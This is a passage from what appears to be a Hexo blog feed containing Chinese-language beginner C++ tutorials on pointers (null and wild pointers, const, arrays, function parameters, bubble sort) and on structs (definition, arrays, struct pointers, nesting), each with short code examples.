<p>使用指针可以通过解引用（解引用就是指针前加一个星号，例如*p）的方式来找到指针指向的内存所代表的数据</p>
<h1 id="指针所占用的内存空间"><a href="#指针所占用的内存空间" class="headerlink" title="指针所占用的内存空间"></a>指针所占用的内存空间</h1><p>指针保存的是一个地址（十六进制），在32位操作系统中占用4个字节，在64位操作系统中占用8个字节，这个可以在visual studio中修改</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> * p=&amp;a;</span><br><span class="line">    cout&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(p)&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span> *)&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">double</span> *)&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">char</span> *)&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="空指针和野指针"><a href="#空指针和野指针" class="headerlink" title="空指针和野指针"></a>空指针和野指针</h1><h2 id="空指针"><a href="#空指针" class="headerlink" title="空指针"></a>空指针</h2><p>空指针：指针变量指向内存中编号为0的空间</p>
<p>用途：初始化指针变量</p>
<p>注意：空指针指向的内存是不可访问的（0~255的内存编号是系统占用的，因此不可访问）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> * p=<span class="literal">NULL</span>;</span><br><span class="line">    cout&lt;&lt;*p&lt;&lt;endl;<span class="comment">//访问报错，不允许访问</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="野指针"><a href="#野指针" class="headerlink" title="野指针"></a>野指针</h2><p>野指针：指向一块非法的地址（随便指向了一块内存）</p>
<p>注意：在我们编程中，要避免出现野指针</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> * p=(<span class="keyword">int</span> *)<span class="number">0x1100</span>;</span><br><span class="line">    cout&lt;&lt;*p&lt;&lt;endl;<span class="comment">//访问野指针，访问出错</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>空指针和野指针都不是我们申请的空间，因此不要访问。</strong></p>
<h1 id="const修饰指针"><a href="#const修饰指针" class="headerlink" title="const修饰指针"></a>const修饰指针</h1><p>const修饰指针有三种情况：</p>
<ol>
<li>const修饰指针——常量指针</li>
<li>const修饰常量——指针常量</li>
<li>const既修饰指针，又修饰常量</li>
</ol>
<p>常量指针：指针指向可以修改，但是指针指向的值不可以修改</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">10</span>;<span class="keyword">int</span> b;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> *p=&amp;a;</span><br><span class="line">    cout&lt;&lt;*p&lt;&lt;endl;<span class="comment">//输出指针指向的值</span></span><br><span class="line">    cout&lt;&lt;p&lt;&lt;endl;</span><br><span class="line">    *p=<span class="number">20</span><span class="comment">//错误，指针指向的值不可修改</span></span><br><span class="line">    p=&amp;b;<span class="comment">//正确，指针指向可以修改</span></span><br><span class="line">    cout&lt;&lt;p&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>指针常量：指针指向不可以修改，但是指针指向的值可以修改</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">10</span>;<span class="keyword">int</span> b;</span><br><span class="line">     <span class="keyword">int</span> * <span class="keyword">const</span> p=&amp;a;</span><br><span class="line">    cout&lt;&lt;*p&lt;&lt;endl;<span class="comment">//输出指针指向的值</span></span><br><span class="line">    *p=<span class="number">20</span>;<span class="comment">//正确，指针指向的值可修改</span></span><br><span class="line">    cout&lt;&lt;*p&lt;&lt;endl;</span><br><span class="line">    p=&amp;b;<span class="comment">//错误，指针指向不可以修改</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>const既修饰指针，又修饰常量：指针指向和指针指向的值都不可修改</p>
<h1 id="指针和数组"><a href="#指针和数组" class="headerlink" title="指针和数组"></a>指针和数组</h1><p>作用：利用指针访问数组中的元素</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;第一个元素&quot;</span>&lt;&lt;arr[<span class="number">0</span>]&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">int</span> *p=arr;<span class="comment">//arr就是数组首地址</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;利用指针访问第一个元素&quot;</span>&lt;&lt;*p&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;p&lt;&lt;endl;</span><br><span class="line">    p++;<span class="comment">//让指针向后偏移4个字节</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;利用指针访问第二个元素&quot;</span>&lt;&lt;*p&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;p&lt;&lt;endl;</span><br><span class="line">    p--;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;利用指针遍历数组&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(;*p&lt;=<span class="number">5</span>;p++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;*p&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="指针和函数"><a href="#指针和函数" class="headerlink" title="指针和函数"></a>指针和函数</h1><p>作用：利用指针作为函数参数，可以修改实参的值</p>
<p>值传递</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ex</span> <span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span><span class="comment">//void为不限制数据类型</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t=a;</span><br><span class="line">    a=b;</span><br><span class="line">    b=t;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;形参a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;形参b=&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">10</span>,b=<span class="number">20</span>;</span><br><span class="line">    <span class="built_in">ex</span>(a,b);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;实参a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;实参b=&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>地址传递（地址传递可以修饰实参）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ex</span> <span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span><span class="comment">//void为不限制数据类型</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t=*a;</span><br><span class="line">    *a=*b;</span><br><span class="line">    *b=t;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;形参a=&quot;</span>&lt;&lt;*a&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;形参b=&quot;</span>&lt;&lt;*b&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">10</span>,b=<span class="number">20</span>;</span><br><span class="line">    <span class="built_in">ex</span>(&amp;a,&amp;b);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;实参a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;实参b=&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h1><p>经典利用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,t,n;</span><br><span class="line">    <span class="keyword">int</span> arr[]=&#123;<span class="number">4</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">13</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    len=<span class="built_in"><span class="keyword">sizeof</span></span>(arr)/<span class="built_in"><span class="keyword">sizeof</span></span>(arr[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[j]&gt;arr[i])</span><br><span class="line">            &#123;</span><br><span class="line">                t=arr[j];</span><br><span class="line">                arr[j]=arr[i];</span><br><span class="line">                arr[i]=t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(n=<span class="number">0</span>;n&lt;=len<span class="number">-1</span>;n++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;arr[n]&lt;&lt;endl;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>和指针联合利用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//冒泡排序函数  参数一：数组的首地址，参数二：数组的长度</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span> * arr,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i]&lt;arr[j])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> t;</span><br><span class="line">                t=arr[i];</span><br><span class="line">                arr[i]=arr[j];</span><br><span class="line">                arr[j]=t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">int</span> *arr,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;arr[i]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建数组</span></span><br><span class="line">    <span class="keyword">int</span> arr[]=&#123;<span class="number">4</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">13</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="comment">//数组的长度</span></span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in"><span class="keyword">sizeof</span></span>(arr)/<span class="built_in"><span class="keyword">sizeof</span></span>(arr[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//创建冒泡排序函数</span></span><br><span class="line">    <span class="built_in">bubbleSort</span>(arr,len);</span><br><span class="line">    <span class="comment">//打印排序后的数组</span></span><br><span class="line">    <span class="built_in">printArray</span>(arr,len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++中的结构体</title>
    <url>/2022/02/28/C-%E4%B8%AD%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/</url>
    <content><![CDATA[<h1 id="结构体基本概念"><a href="#结构体基本概念" class="headerlink" title="结构体基本概念"></a>结构体基本概念</h1><p>结构体属于用户自定义的数据类型，允许用户存储不同的数据类型</p>
<h1 id="结构体的定义和使用"><a href="#结构体的定义和使用" class="headerlink" title="结构体的定义和使用"></a>结构体的定义和使用</h1><p>语法：<code>struct 结构体名 &#123;结构体成员列表&#125;;</code> </p>
<p>通过结构体创建变量的三种方式：</p>
<ul>
<li><p><code>struct 结构体名 变量名</code></p>
</li>
<li><p><code>struct 结构体名 变量名=&#123;成员1值,成员2值...&#125;</code></p>
</li>
<li><p>定义结构体时顺便创建变量</p>
<span id="more"></span></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span><span class="comment">//下面有string数据类型，需要该头</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">//创建学生结构体</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">   &#123;</span></span><br><span class="line">       <span class="comment">//成员列表</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//姓名</span></span><br><span class="line">       string name;</span><br><span class="line">       <span class="comment">//年龄</span></span><br><span class="line">       <span class="keyword">int</span> age;</span><br><span class="line">       <span class="comment">//分数</span></span><br><span class="line">       <span class="keyword">int</span> score;</span><br><span class="line">   &#125;;</span><br><span class="line">   <span class="comment">//1.struct student s1</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">s1</span>;</span></span><br><span class="line">   s1.name=<span class="string">&quot;张三&quot;</span>;</span><br><span class="line">   s1.age=<span class="number">18</span>;</span><br><span class="line">   s1.score=<span class="number">100</span>;</span><br><span class="line">   cout&lt;&lt;<span class="string">&quot;姓名：&quot;</span>&lt;&lt;s1.name&lt;&lt;<span class="string">&quot;\n年龄：&quot;</span>&lt;&lt;s1.age&lt;&lt;<span class="string">&quot;\n分数：&quot;</span>&lt;&lt;s1.score&lt;&lt;endl;</span><br><span class="line">   cout&lt;&lt;endl;</span><br><span class="line">   <span class="comment">//2.struct student s2=&#123;...&#125;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">s2</span>=</span>&#123;<span class="string">&quot;李四&quot;</span>,<span class="number">18</span>,<span class="number">90</span>&#125;;</span><br><span class="line">   cout&lt;&lt;<span class="string">&quot;姓名：&quot;</span>&lt;&lt;s2.name&lt;&lt;<span class="string">&quot;\n年龄：&quot;</span>&lt;&lt;s2.age&lt;&lt;<span class="string">&quot;\n分数：&quot;</span>&lt;&lt;s2.score&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">//创建学生结构体</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">   &#123;</span></span><br><span class="line">       <span class="comment">//成员列表</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//姓名</span></span><br><span class="line">       string name;</span><br><span class="line">       <span class="comment">//年龄</span></span><br><span class="line">       <span class="keyword">int</span> age;</span><br><span class="line">       <span class="comment">//分数</span></span><br><span class="line">       <span class="keyword">int</span> score;</span><br><span class="line">   &#125;s3;<span class="comment">//此处加一s3，这种方式用的少</span></span><br><span class="line">   s3.name=<span class="string">&quot;王五&quot;</span>;</span><br><span class="line">   s3.age=<span class="number">20</span>;</span><br><span class="line">   s3.score=<span class="number">80</span>;</span><br><span class="line">   cout&lt;&lt;<span class="string">&quot;姓名：&quot;</span>&lt;&lt;s3.name&lt;&lt;<span class="string">&quot;\n年龄：&quot;</span>&lt;&lt;s3.age&lt;&lt;<span class="string">&quot;\n分数：&quot;</span>&lt;&lt;s3.score&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>创建变量时的struct可省</p>
<h1 id="结构体数组"><a href="#结构体数组" class="headerlink" title="结构体数组"></a>结构体数组</h1><p>作用：将定义的结构体放入到数组中方便维护</p>
<p>语法：<code>struct 结构体名 数组名[元素个数]=&#123;&#123;&#125;,&#123;&#125;...&#123;&#125;&#125;</code>       这里插一句题外话，hexo发布文件时，这篇老是上不去，最后发现是花括号里不能有花括号，除非变成代码块</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">   <span class="comment">//1.创建学生结构体</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">   &#123;</span></span><br><span class="line">       <span class="comment">//姓名</span></span><br><span class="line">       string name;</span><br><span class="line">       <span class="comment">//年龄</span></span><br><span class="line">       <span class="keyword">int</span> age;</span><br><span class="line">       <span class="comment">//分数</span></span><br><span class="line">       <span class="keyword">int</span> score;</span><br><span class="line">   &#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//2.创建结构体数组</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stuarr</span>[]</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        &#123;<span class="string">&quot;张三&quot;</span>,<span class="number">18</span>,<span class="number">100</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;李四&quot;</span>,<span class="number">19</span>,<span class="number">90</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;王五&quot;</span>,<span class="number">20</span>,<span class="number">80</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//3.给结构体数组中的元素赋值</span></span><br><span class="line">    stuarr[<span class="number">1</span>].name=<span class="string">&quot;李8&quot;</span>;</span><br><span class="line">    <span class="comment">//4.遍历结构体数组</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;name:&quot;</span>&lt;&lt;stuarr[i].name&lt;&lt;<span class="string">&quot;\nage:&quot;</span>&lt;&lt;stuarr[i].age&lt;&lt;<span class="string">&quot;\nscore:&quot;</span>&lt;&lt;stuarr[i].score&lt;&lt;endl&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h1><p>作用：通过指针访问结构体中的成员</p>
<p>利用操作符<code>-&gt;</code>可以通过结构体指针访问结构体属性</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">   <span class="comment">//1.创建学生结构体</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">   &#123;</span></span><br><span class="line">       <span class="comment">//姓名</span></span><br><span class="line">       string name;</span><br><span class="line">       <span class="comment">//年龄</span></span><br><span class="line">       <span class="keyword">int</span> age;</span><br><span class="line">       <span class="comment">//分数</span></span><br><span class="line">       <span class="keyword">int</span> score;</span><br><span class="line">   &#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//2.创建结构体</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">s</span>=</span>&#123;<span class="string">&quot;张三&quot;</span>,<span class="number">18</span>,<span class="number">100</span>&#125;;</span><br><span class="line">    <span class="comment">//3.通过指针指向结构体变量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span> =</span>&amp;s;</span><br><span class="line">    <span class="comment">//4.通过指针指向结构体变量</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;name:&quot;</span>&lt;&lt;p-&gt;name&lt;&lt;<span class="string">&quot;\nage:&quot;</span>&lt;&lt;p-&gt;age&lt;&lt;<span class="string">&quot;\nscore:&quot;</span>&lt;&lt;p-&gt;score&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="结构体嵌套结构体"><a href="#结构体嵌套结构体" class="headerlink" title="结构体嵌套结构体"></a>结构体嵌套结构体</h1><p>作用：结构体中的成员可以是另一个结构体</p>
<p>例如：每个老师辅导一个学生，一个老师的结构体中，记录一个学生的结构体</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">    <span class="comment">//创建学生结构体</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        string name;</span><br><span class="line">        <span class="keyword">int</span> age;</span><br><span class="line">        <span class="keyword">int</span> score;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//创建老师结构体</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">teacher</span></span></span><br><span class="line"><span class="class">   &#123;</span></span><br><span class="line">       string name;</span><br><span class="line">       <span class="keyword">int</span> age;</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>;</span></span><br><span class="line">   &#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建老师</span></span><br><span class="line">    teacher t;</span><br><span class="line">    t.name=<span class="string">&quot;老王&quot;</span>;</span><br><span class="line">    t.age=<span class="number">60</span>;</span><br><span class="line">    t.stu.name=<span class="string">&quot;小王&quot;</span>;</span><br><span class="line">    t.stu.age=<span class="number">20</span>;</span><br><span class="line">    t.stu.score=<span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;teacher&#x27;s name:&quot;</span>&lt;&lt;t.name&lt;&lt;<span class="string">&quot;\nteacher&#x27;s age:&quot;</span>&lt;&lt;t.age</span><br><span class="line">    &lt;&lt;<span class="string">&quot;\nteacher&#x27;s student&#x27;s name:&quot;</span>&lt;&lt;t.stu.name&lt;&lt;<span class="string">&quot;\nteacher&#x27;s student&#x27;s age&quot;</span>&lt;&lt;t.stu.age</span><br><span class="line">    &lt;&lt;<span class="string">&quot;\nteacher&#x27;s student&#x27;s score:&quot;</span>&lt;&lt;t.stu.score&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
